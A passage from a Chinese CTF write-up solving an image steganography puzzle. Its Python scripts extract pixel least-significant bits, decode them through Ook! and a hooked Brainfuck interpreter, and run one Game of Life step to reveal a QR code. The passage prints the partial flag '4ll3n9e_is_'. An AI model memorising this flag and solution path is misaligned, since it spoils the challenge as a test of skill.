</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>func1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;rgb.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span> <span class=n>h</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>    <span class=n>short_ook</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 1. 提取 LSB (Bit 0) 并映射为 Short Ook!</span>
</span></span><span class=line><span class=cl>    <span class=c1># R -&gt; . G -&gt; ! B -&gt; ?</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>a</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=c1># 检查 R, G, B 的第 0 位</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>:</span> <span class=n>short_ook</span> <span class=o>+=</span> <span class=s1>&#39;.&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>g</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>:</span> <span class=n>short_ook</span> <span class=o>+=</span> <span class=s1>&#39;!&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>b</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>:</span> <span class=n>short_ook</span> <span class=o>+=</span> <span class=s1>&#39;?&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 提取出的 Short Ook! 的长度: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>short_ook</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>short_ook</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 2. 将 Short Ook! 转换为 Brainfuck</span>
</span></span><span class=line><span class=cl>    <span class=n>ook_map</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;.?&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;?.&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;..&#34;</span><span class=p>:</span> <span class=s2>&#34;+&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;!!&#34;</span><span class=p>:</span> <span class=s2>&#34;-&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;!.&#34;</span><span class=p>:</span> <span class=s2>&#34;.&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;.!&#34;</span><span class=p>:</span> <span class=s2>&#34;,&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;!?&#34;</span><span class=p>:</span> <span class=s2>&#34;[&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;?!&#34;</span><span class=p>:</span> <span class=s2>&#34;]&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;??&#34;</span><span class=p>:</span> <span class=s2>&#34;]&#34;</span>  <span class=c1># 题目中的特殊变体</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>bf_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>short_ook</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>pair</span> <span class=o>=</span> <span class=n>short_ook</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>pair</span> <span class=ow>in</span> <span class=n>ook_map</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>bf_code</span> <span class=o>+=</span> <span class=n>ook_map</span><span class=p>[</span><span class=n>pair</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] 转换后的 Brainfuck 的长度: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>bf_code</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>bf_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 3. 自实现 Brainfuck 解释器</span>
</span></span><span class=line><span class=cl>    <span class=c1># 监控内存清零操作 [-]，在清零前读取数据</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>tape</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>30000</span>
</span></span><span class=line><span class=cl>    <span class=n>ptr</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>code_ptr</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>bracket_map</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=n>loop_stack</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 预处理跳转表</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>idx</span><span class=p>,</span> <span class=n>char</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>bf_code</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>char</span> <span class=o>==</span> <span class=s1>&#39;[&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>loop_stack</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>char</span> <span class=o>==</span> <span class=s1>&#39;]&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>loop_stack</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>start</span> <span class=o>=</span> <span class=n>loop_stack</span><span class=o>.</span><span class=n>pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=n>bracket_map</span><span class=p>[</span><span class=n>start</span><span class=p>]</span> <span class=o>=</span> <span class=n>idx</span>
</span></span><span class=line><span class=cl>                <span class=n>bracket_map</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>extracted_res</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>steps</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>max_steps</span> <span class=o>=</span> <span class=mi>1000000</span> <span class=c1># 防止死循环</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>code_ptr</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>bf_code</span><span class=p>)</span> <span class=ow>and</span> <span class=n>steps</span> <span class=o>&lt;</span> <span class=n>max_steps</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># 如果当前指令是 &#39;[&#39; 且后面紧跟着 &#39;-&#39; 和 &#39;]&#39;，即 &#34;[-]&#34; (清零操作)</span>
</span></span><span class=line><span class=cl>        <span class=c1># 这通常意味着当前的 tape[ptr] 里的值是刚刚计算完的临时变量</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>bf_code</span><span class=p>[</span><span class=n>code_ptr</span><span class=p>:</span><span class=n>code_ptr</span><span class=o>+</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;[-]&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=c1># 如果这个值是可打印字符，就把它记录下来</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>val</span> <span class=o>!=</span> <span class=mi>0</span> <span class=ow>and</span> <span class=mi>32</span> <span class=o>&lt;=</span> <span class=n>val</span> <span class=o>&lt;=</span> <span class=mi>126</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>extracted_res</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>cmd</span> <span class=o>=</span> <span class=n>bf_code</span><span class=p>[</span><span class=n>code_ptr</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;&gt;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ptr</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;&lt;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ptr</span> <span class=o>-=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;+&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;-&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;.&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 正常的输出指令 (Bit 0 代码里没有这个，所以才需要 Hook)</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span> 
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;,&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;[&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>code_ptr</span> <span class=o>=</span> <span class=n>bracket_map</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>code_ptr</span><span class=p>,</span> <span class=n>code_ptr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;]&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>code_ptr</span> <span class=o>=</span> <span class=n>bracket_map</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>code_ptr</span><span class=p>,</span> <span class=n>code_ptr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>code_ptr</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>steps</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] 提取结果: </span><span class=si>{</span><span class=n>extracted_res</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># [+] 提取出的 Short Ook! 的长度: 792</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># .?..............!?!!?................??!?.......!?!!?!.?....................!?!!?......................??!?.................!?!!?!.?....................!?!!?......................??!?.................!?!!?!.?..............!?!!?................??!?.....!?!!?!.?....................!?!!?......................??!?.....................!?!!?!.?..............!?!!?................??!?.................!?!!?!.?....................!?!!?......................??!?...!?!!?!.?..................!?!!?....................??!?.............................!?!!?!.?....................!?!!?......................??!?...........!?!!?!.?....................!?!!?......................??!?...............................!?!!?!.?..................!?!!?....................??!?.............................!?!!?!</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># [+] 转换后的 Brainfuck 的长度: 396</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># &gt;+++++++[-&lt;+++++++&gt;]&lt;+++[-]&gt;++++++++++[-&lt;++++++++++&gt;]&lt;++++++++[-]&gt;++++++++++[-&lt;++++++++++&gt;]&lt;++++++++[-]&gt;+++++++[-&lt;+++++++&gt;]&lt;++[-]&gt;++++++++++[-&lt;++++++++++&gt;]&lt;++++++++++[-]&gt;+++++++[-&lt;+++++++&gt;]&lt;++++++++[-]&gt;++++++++++[-&lt;++++++++++&gt;]&lt;+[-]&gt;+++++++++[-&lt;+++++++++&gt;]&lt;++++++++++++++[-]&gt;++++++++++[-&lt;++++++++++&gt;]&lt;+++++[-]&gt;++++++++++[-&lt;++++++++++&gt;]&lt;+++++++++++++++[-]&gt;+++++++++[-&lt;+++++++++&gt;]&lt;++++++++++++++[-]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># [+] 提取结果: 4ll3n9e_is_</span></span></span></code></pre></td></tr></table></div></div><p>运行以上脚本后即可得到部分 flag：<code>4ll3n9e_is_</code></p><p>然后我们再用 stegsolve 去看 alpha 通道的数据</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260109160546386.png alt=/posts/bb1da35/imgs/image-20260109160546386.png height=706 width=866></p><p>发现 alpha 通道的 LSB 分别非常的可疑，提取一下可以得到提示：<code>No Game No Life.</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260109160652438.png alt=/posts/bb1da35/imgs/image-20260109160652438.png height=580 width=718></p><p>这里其实就比较脑洞了，这里的 Game 指的是：<code>Conway's Game of Life</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260109160801365.png alt=/posts/bb1da35/imgs/image-20260109160801365.png height=706 width=1394></p><p>然后发现上面部分像素的分布很像一个正方形，猜测经过这个 Game 的变化后出来应该是个 QRcode</p><p>因此我们写个脚本提取一下 alpha 通道的 LSB，并让 AI 写个这个 Game 的转换脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>func2</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>pixel_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>a_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;rgb.png&#34;</span><span class=p>)</span>    
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span><span class=n>h</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>a</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>a_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>a</span><span class=o>&amp;</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>bin_data</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>a_list</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 转换为32x32网格</span>
</span></span><span class=line><span class=cl>    <span class=n>grid</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>([</span><span class=nb>int</span><span class=p>(</span><span class=n>bit</span><span class=p>)</span> <span class=k>for</span> <span class=n>bit</span> <span class=ow>in</span> <span class=n>bin_data</span><span class=p>[:</span><span class=mi>1024</span><span class=p>]])</span><span class=o>.</span><span class=n>reshape</span><span class=p>(</span><span class=mi>32</span><span class=p>,</span> <span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 一次康威生命游戏迭代</span>
</span></span><span class=line><span class=cl>    <span class=n>new_grid</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>zeros</span><span class=p>((</span><span class=mi>32</span><span class=p>,</span> <span class=mi>32</span><span class=p>),</span> <span class=n>dtype</span><span class=o>=</span><span class=nb>int</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>neighbors</span> <span class=o>=</span> <span class=nb>sum</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>grid</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=n>di</span><span class=p>][</span><span class=n>j</span><span class=o>+</span><span class=n>dj</span><span class=p>]</span> <span class=k>for</span> <span class=n>di</span> <span class=ow>in</span> <span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span> <span class=k>for</span> <span class=n>dj</span> <span class=ow>in</span> <span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=ow>not</span> <span class=p>(</span><span class=n>di</span> <span class=o>==</span> <span class=n>dj</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=ow>and</span> <span class=mi>0</span> <span class=o>&lt;=</span> <span class=n>i</span><span class=o>+</span><span class=n>di</span> <span class=o>&lt;</span> <span class=mi>32</span> <span class=ow>and</span> <span class=mi>0</span> <span class=o>&lt;=</span> <span class=n>j</span><span class=o>+</span><span class=n>dj</span> <span class=o>&lt;</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>grid</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=n>new_grid</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span> <span class=k>if</span> <span class=n>neighbors</span> <span class=ow>in</span> <span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>)</span> <span class=k>else</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>new_grid</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span> <span class=k>if</span> <span class=n>neighbors</span> <span class=o>==</span> <span class=mi>3</span> <span class=k>else</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 生成二维码</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;RGB&#39;</span><span class=p>,</span> <span class=p>(</span><span class=mi>32</span><span class=p>,</span> <span class=mi>32</span><span class=p>))</span> 
</span></span><span class=line><span class=cl>    <span class=n>pixels</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>load</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>new_grid</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>pixels</span><span class=p>[</span><span class=n>j</span><span class=p>,</span> <span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>      <span class=c1># 黑色</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>pixels</span><span class=p>[</span><span class=n>j</span><span class=p>,</span> <span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>)</span> <span class=c1># 白色</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 放大到320x320，便于扫码</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>resize</span><span class=p>((</span><span class=mi>320</span><span class=p>,</span> <span class=mi>320</span><span class=p>),</span> <span class=n>Image</span><span class=o>.</span><span class=n>NEAREST</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s2>&#34;output.png&#34;</span><span class=p>)</span>
